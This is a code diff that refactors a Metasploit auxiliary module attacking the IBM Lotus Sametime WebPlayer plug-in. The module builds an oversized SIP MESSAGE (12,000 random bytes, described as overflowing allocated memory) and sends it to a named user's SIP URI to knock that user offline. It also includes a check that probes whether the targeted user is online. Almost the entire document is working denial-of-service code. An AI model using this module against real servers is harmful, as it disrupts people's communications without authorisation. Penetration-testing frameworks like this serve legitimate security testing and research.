@@ -21,21 +21,25 @@ class Metasploit3 < Msf::Auxiliary
         the Sametime Audio Visual browser plug-in (WebPlayer) loaded as a
         browser extension. The user should have the WebPlayer plug-in active
         (i.e. be in a Sametime Audio/Video meeting for this DoS to work correctly.
-
-        RHOST Target should be the Sametime Media Server address and NOT the
-        web interface SIPURI should be in the format
-         <target_email_address>@<sametime_media_server_FQDN> (e.g.
-         targetuser%40targetdomain.com@stmedia.targetdomain.com
       },
       'Author'     =>
         [
+          'Chris John Riley', # Vulnerability discovery
           'kicks4kittens' # Metasploit module
         ],
       'License'    => MSF_LICENSE,
       'Actions'    =>
         [
-          ['DOS'],
-          ['CHECK']
+          ['DOS',
+            {
+              'Description' => 'Cause a Denial Of Service condition against a connected user'
+            }
+          ],
+          ['CHECK',
+            {
+              'Description' => 'Checking if targeted user is online'
+            }
+          ]
         ],
       'DefaultAction'  => 'DOS',
       'References'   =>
@@ -51,9 +55,12 @@ class Metasploit3 < Msf::Auxiliary
     register_options(
       [
         Opt::RPORT(5060),
-        OptString.new('SIPURI', [true, 'The SIP URI of the user to be targeted',
-                '<target_email_address>@<sametime_media_server_FQDN>']),
-        OptBool.new('CHECKUSER', [ true,  'Validate user is logged into Sametime', true]),
+        OptAddress.new('RHOST', [true, 'The Sametime Media Server']),
+        OptString.new('SIPURI', [
+          true,
+          'The SIP URI of the user to be targeted',
+          '<target_email_address>@<sametime_media_server_FQDN>'
+        ]),
         OptInt.new('TIMEOUT', [ true,  'Set specific response timeout', 0])
       ], self.class)
 
@@ -62,88 +69,97 @@ class Metasploit3 < Msf::Auxiliary
   def setup
     # cleanup SIP target to ensure it's in the correct format to use
     @sipuri = datastore['SIPURI']
-    if @sipuri[0,4].downcase == "sip:"
+    if @sipuri[0, 4].downcase == "sip:"
       # remove sip: if present in string
-      @sipuri = @sipuri[4,@sipuri.length]
+      @sipuri = @sipuri[4, @sipuri.length]
     end
-    if @sipuri[0,12].downcase == "webavclient-"
+    if @sipuri[0, 12].downcase == "webavclient-"
       # remove WebAVClient- if present in string
-      @sipuri = @sipuri[12,@sipuri.length]
+      @sipuri = @sipuri[12, @sipuri.length]
+    end
+  end
+
+  def run
+    # inform user of action currently selected
+    print_status("Action: #{action.name} selected")
+
+    # CHECK action
+    if action.name == 'CHECK'
+      check_user
+      return
+    end
+
+    # DOS action
+    print_status("#{peer} - Checking if user #{@sipuri} is online")
+    check_result = check_user
+
+    if check_result == false
+      print_error("#{peer} - User is already offline... Exiting...")
+      return
+    end
+
+    # only proceed if action is DOS the target user is
+    # online or the CHECKUSER option has been disabled
+    print_status("#{peer} - Targeting user: #{@sipuri}...")
+    dos_result = dos_user
+
+    if dos_result
+      print_good("#{peer} - User is offline, DoS was successful")
+    else
+      print_error("#{peer} - User is still online")
     end
 
   end
 
-  def checkuser
-    # used to check the user is logged into Sametime and after DoS to check success
+  def peer
+    "#{rhost}:#{rport}"
+  end
+
+  def dos_user
+    length = 12000 # enough to overflow the end of allocated memory
+    msg = create_message(length)
+    res = send_msg(msg)
+
+    if res.nil?
+      vprint_good("#{peer} - User #{@sipuri} is no responding")
+      return false
+    elsif res =~ /430 Flow Failed/i
+      vprint_good("#{peer} - DoS packet successful. Response received (430 Flow Failed)")
+      vprint_good("#{peer} - User #{@sipuri} is no longer responding")
+      return false
+    elsif res =~ /404 Not Found/i
+      vprint_error("#{peer} - DoS packet appears successful. Response received (404 Not Found)")
+      vprint_status("#{peer} - User appears to be currently offline or not in a Sametime video session")
+      return false
+    elsif res =~ /200 OK/i
+      vrint_error("#{peer} - DoS packet unsuccessful. Response received (200)")
+      vrint_status("#{peer} - Check user is running an effected version of IBM Lotus Sametime WebPlayer")
+      return true
+    end
+  end
+
+  # used to check the user is logged into Sametime and after DoS to check success
+  def check_user
     length = Rex::Text.rand_text_numeric(2) # just enough to check response
     msg = create_message(length)
-
-    print_status("Checking if targeted user #{@sipuri} is online")
     res = send_msg(msg)
 
     # check response for current user status - common return codes
     if res.nil?
-      print_error("No response recevied from server")
+      vprint_error("#{peer} - No response")
       return false
     elsif res =~ /430 Flow Failed/i
-      print_good("User #{@sipuri} is no longer responding (already DoS'd?)")
+      vprint_good("#{peer} - User #{@sipuri} is no longer responding (already DoS'd?)")
       return false
     elsif res =~ /404 Not Found/i
-      print_error("User #{@sipuri} is currently offline or not in a Sametime video session")
+      vprint_error("#{peer} - User #{@sipuri} is currently offline or not in a Sametime video session")
       return false
     elsif res =~ /200 OK/i
-      print_good("User #{@sipuri} is online")
+      vprint_good("#{peer} - User #{@sipuri} is online")
       return true
     else
-      print_error("Unknown server response")
+      vprint_error("#{peer} - Unknown server response")
       return false
-    end
-
-  end
-
-  def run
-
-    # inform user of action currently selected
-    print_status("Action: #{action.name} selected")
-
-    if datastore['CHECKUSER'] or action.name == 'CHECK'
-      # check the user is online without DOS
-      response = checkuser
-    else
-      print_status("User check disabled, continuing with DoS against #{@sipuri}")
-      response = true # no check performed
-    end
-
-    unless action.name == 'CHECK' # only proceed if action not set to CHECK
-      if response
-        # checkuser explicitly disabled or user is online
-
-        print_status("Targeting user: #{@sipuri}")
-        print_status("Sending DoS packet to #{rhost}:#{rport}")
-
-        length = 12000 # enough to overflow the end of allocated memory
-        msg = create_message(length)
-        res = send_msg(msg)
-
-        if res.nil?
-          if datastore['CHECKUSER'] # check user AFTER DoS
-            print_good("User #{@sipuri} is no longer responding")
-          else
-            print_good("No response from server. User is offline or server doesn't respond")
-          end
-        elsif res =~ /430 Flow Failed/i
-          print_good("DoS packet successful. Response received (430 Flow Failed)")
-          print_good("User #{@sipuri} is no longer responding")
-        elsif res =~ /404 Not Found/i
-          print_error("DoS packet appears successful. Response received (404 Not Found)")
-          print_status("User appears to be currently offline or not in a Sametime video session")
-        elsif res =~ /200 OK/i
-          print_error("DoS packet unsuccessful. Response received (200)")
-          print_status("Check user is running an effected version of IBM Lotus Sametime WebPlayer")
-        end
-      else
-        print_error("Check failed, ensure user is online")
-      end
     end
   end
 
@@ -151,9 +167,9 @@ class Metasploit3 < Msf::Auxiliary
     # create SIP MESSAGE of specified length
     vprint_status("Creating SIP MESSAGE packet #{length} bytes long")
 
-    suser = Rex::Text.rand_text_alphanumeric(rand(8)+1)
-    shost = Rex::Socket.source_address(datastore['RHOST'])
-    src   = "#{shost}:#{datastore['RPORT']}"
+    source_user = Rex::Text.rand_text_alphanumeric(rand(8)+1)
+    source_host = Rex::Socket.source_address(datastore['RHOST'])
+    src = "#{source_host}:#{datastore['RPORT']}"
     cseq = Rex::Text.rand_text_numeric(3)
     message_text = Rex::Text.rand_text_alphanumeric(length.to_i)
     branch = Rex::Text.rand_text_alphanumeric(7)
@@ -163,11 +179,11 @@ class Metasploit3 < Msf::Auxiliary
     data << "Via: SIP/2.0/TCP #{src};branch=#{branch}.#{"%.8x" % rand(0x100000000)};rport;alias" + "\r\n"
     data << "Max-Forwards: 80\r\n"
     data << "To: sip:WebAVClient-#{@sipuri}" + "\r\n"
-    data << "From: sip:#{suser}@#{src};tag=70c00e8c" + "\r\n"
-    data << "Call-ID: #{rand(0x100000000)}@#{shost}" + "\r\n"
+    data << "From: sip:#{source_user}@#{src};tag=70c00e8c" + "\r\n"
+    data << "Call-ID: #{rand(0x100000000)}@#{source_host}" + "\r\n"
     data << "CSeq: #{cseq} MESSAGE" + "\r\n"
     data << "Content-Type: text/plain;charset=utf-8" + "\r\n"
-    data << "User-Agent: #{suser}\r\n"
+    data << "User-Agent: #{source_user}\r\n"
     data << "Content-Length: #{message_text.length}" + "\r\n\r\n"
     data << message_text
 
@@ -183,7 +199,6 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   def send_msg(msg)
-
     begin
       s = connect
       # send message and store response
@@ -196,11 +211,14 @@ class Metasploit3 < Msf::Auxiliary
       end
       return res
     rescue ::Rex::ConnectionRefused
-      print_status("Unable to connect to #{rhost}:#{rport}")
+      print_status("#{peer} - Unable to connect")
+      return nil
     rescue ::Errno::ECONNRESET
-      print_status("DoS packet successful. #{rhost} not responding.")
+      print_status("#{peer} - DoS packet successful, host not responding.")
+      return nil
     rescue ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
-      print_status("Couldn't connect to #{rhost}:#{rport}")
+      print_status("#{peer} - Couldn't connect")
+      return nil
     ensure
       # disconnect socket if still open
       disconnect if s
